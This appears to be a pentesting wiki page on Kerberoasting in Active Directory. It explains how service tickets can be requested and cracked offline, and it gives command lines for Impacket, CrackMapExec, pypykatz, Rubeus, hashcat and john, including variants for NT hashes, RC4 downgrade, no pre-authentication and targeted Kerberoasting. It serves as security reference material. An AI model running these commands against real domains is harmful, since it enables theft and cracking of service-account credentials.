---
description: MITRE ATT&CK™ Sub-technique T1558.003
---

# Kerberoast

## Theory

When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (`sname`) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.

Multiple formats are accepted for the `sname` field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc. (see [Kerberos tickets](./#tickets)).

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. This is Kerberoasting.

## Practice

{% hint style="warning" %}
Unlike [ASREProasting](asreproast.md), this attack can only be carried out with a prior foothold (valid domain credentials), except in the [Kerberoasting without pre-authentication](kerberoast.md#undefined) scenario.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.

{% hint style="info" %}
The Kerberoasting attack can be conducted without knowing any SPN of the target account, since a service ticket can be request for as long as the service's SAN (`sAMAccountName`) is known. ([swarm.ptsecurity.com](https://swarm.ptsecurity.com/kerberoasting-without-spns/))

Nota bene, Kerberos can deliver service tickets even if the service has no SPN at all, but then the service's SAN must end with `$`, and in this case it's hard to know for sure if the service's password is defined by a human. Kerberoast attacks usually target user accounts with at least one SPN (`servicePrincipalName`) since they probably have human-defined passwords (sources: [Twitter](https://twitter.com/SteveSyfuhs/status/1613956603807690753) and [\[MS-KILE\] section 3.3.5.1.1](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/a7ad31b0-37a4-4344-b9a7-01d4d086097e)).
{% endhint %}

```bash
# with a password
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python).

```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
```

Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.

```bash
pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
```
{% endtab %}

{% tab title="Windows" %}
[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.

{% code overflow="wrap" %}
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

[Hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can then be used to try [cracking the hash](../credentials/cracking.md).

```bash
hashcat -m 13100 kerberoastables.txt $wordlist
```

```bash
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```

### Kerberoast w/o pre-authentication

In September 2022, [Charlie Cark](https://twitter.com/exploitph) explained how Service Tickets could be obtained through `AS-REQ` requests (which are usually used for TGT requests), instead of the usual `TGS-REQ`. He demonstrated (and [implemented](https://github.com/GhostPack/Rubeus/pull/139)) how to abuse this in a Kerberoasting scenario.

If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](asreproast.md) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.

_At the time of writing, Sept. 28th 2022,_ [_the pull request (#1413)_](https://github.com/SecureAuthCorp/impacket/pull/1413) _adding the `-no-preauth` option for `GetUserSPNs.py` is pending._

{% code overflow="wrap" %}
```bash
GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
```
{% endcode %}

{% code title="usersfile example" lineNumbers="true" %}
```
srv01
cifs/srv02.domain.local
cifs/srv02
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.

_At the time of writing, Sept. 28th 2022,_ [_the pull request (#139)_](https://github.com/GhostPack/Rubeus/pull/139) _adding the `/nopreauth` option for Rubeus' `kerberoast` command is pending._

{% code overflow="wrap" %}
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service"
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Targeted Kerberoasting

If an attacker controls an account with the rights to add an SPN to another ([`GenericAll`](../dacl/#genericall), [`GenericWrite`](../dacl/#genericwrite)), it can be abused to make that other account vulnerable to Kerberoast (see [exploitation](../dacl/targeted-kerberoasting.md)).

{% hint style="info" %}
Controlling a member of the [Account Operators](../domain-settings/builtin-groups.md) group, targeted Kerberoasting can be conducted for the whole domain (see [exploitation](../dacl/targeted-kerberoasting.md)).
{% endhint %}

## Resources

{% embed url="https://en.hackndo.com/kerberos" %}

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/" %}

{% embed url="https://swarm.ptsecurity.com/kerberoasting-without-spns/" %}
